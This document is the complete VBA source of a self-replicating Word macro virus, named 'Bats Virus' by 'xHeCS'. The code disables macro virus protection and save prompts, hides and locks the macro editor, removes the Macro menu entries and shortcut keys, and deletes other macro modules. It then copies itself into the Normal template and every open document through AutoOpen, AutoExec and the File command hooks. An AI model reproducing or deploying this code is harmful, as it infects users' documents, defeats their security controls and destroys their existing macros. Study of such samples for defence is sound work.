   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AstecCTL"
   ' This Virus was creted to test the infection routine
   Sub AstecVx()
     On Error Resume Next
       On Error Resume Next
       Application.UserName = "xHeCS"
       With Dialogs(wdDialogFileSummaryInfo)
           .Author = "xHeCS"
           .Execute
       End With
       With Options
           .ConfirmConversions = False
           .VirusProtection = False
           .SaveNormalPrompt = False
       End With
       With ActiveDocument
           .ReadOnlyRecommended = False
       End With
       On Error Resume Next
       CommandBars("Visual Basic").Visible = False
       CommandBars("Visual Basic").Enabled = False
       CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
       CommandBars("Visual Basic").Protection = msoBarNoCustomize
       CommandBars("Tools").Controls("Macro").Delete
       CommandBars("Tools").Controls("Customize...").Delete
       CustomizationContext = NormalTemplate
       FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
       FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
       NTInfected = False
           For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
               clan = NormalTemplate.VBProject.VBComponents(i).Name
                   If clan = "AstecCTL" Then NTInfected = True
                   If (clan <> "AstecCTL") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
           Next i
           For Each opendoc In Documents
               ODInfected = False
               With opendoc
                   For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                   clan = opendoc.VBProject.VBComponents(J).Name
                       If clan = "AstecCTL" Then ODInfected = True
                       If (clan <> "AstecCTL") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                   Next J
                   If ODInfected = False Then
                       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="AstecCTL", Object:=wdOrganizerObjectProjectItems
                       opendoc.SaveAs FileName:=opendoc.FullName
                   End If
               End With
           Next opendoc
               If NTInfected = False Then
                   Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AstecCTL", Object:=wdOrganizerObjectProjectItems
                   NormalTemplate.Save
               End If
   If (Day(Date) = 7) Then
             MsgBox " Bats Virus Version 1.0 by (C)2000 xHeCS ", vbCritical
   End If
   End Sub
   Sub FileSave()
       On Error Resume Next
       Call AstecVx
       ActiveDocument.Save
   End Sub
   Sub FileClose()
       On Error Resume Next
       Call AstecVx
       If ActiveDocument.Saved = False Then ActiveDocument.Save
       ActiveDocument.Close
   End Sub
   Sub FileExit()
       On Error Resume Next
       Call AstecVx
       If ActiveDocument.Saved = False Then ActiveDocument.Save
       Application.quit
   End Sub
   Sub FileNew()
       On Error Resume Next
       Dialogs(wdDialogFileNew).Show
       newfile$ = 1
       Call AstecVx
   End Sub
   Sub AutoOpen()
       On Error Resume Next
       Call AstecVx
   End Sub
   Sub AutoExec()
       On Error Resume Next
       Call AstecVx
   End Sub
   Sub AutoClose()
       On Error Resume Next
       Call AstecVx
   End Sub
   Sub FileSaveAs()
       On Error Resume Next
       Call AstecVx
       Dialogs(wdDialogFileSaveAs).Show
   End Sub
   Sub FileOpen()
       On Error Resume Next
       Dialogs(wdDialogFileOpen).Show
       Call AstecVx
   End Sub
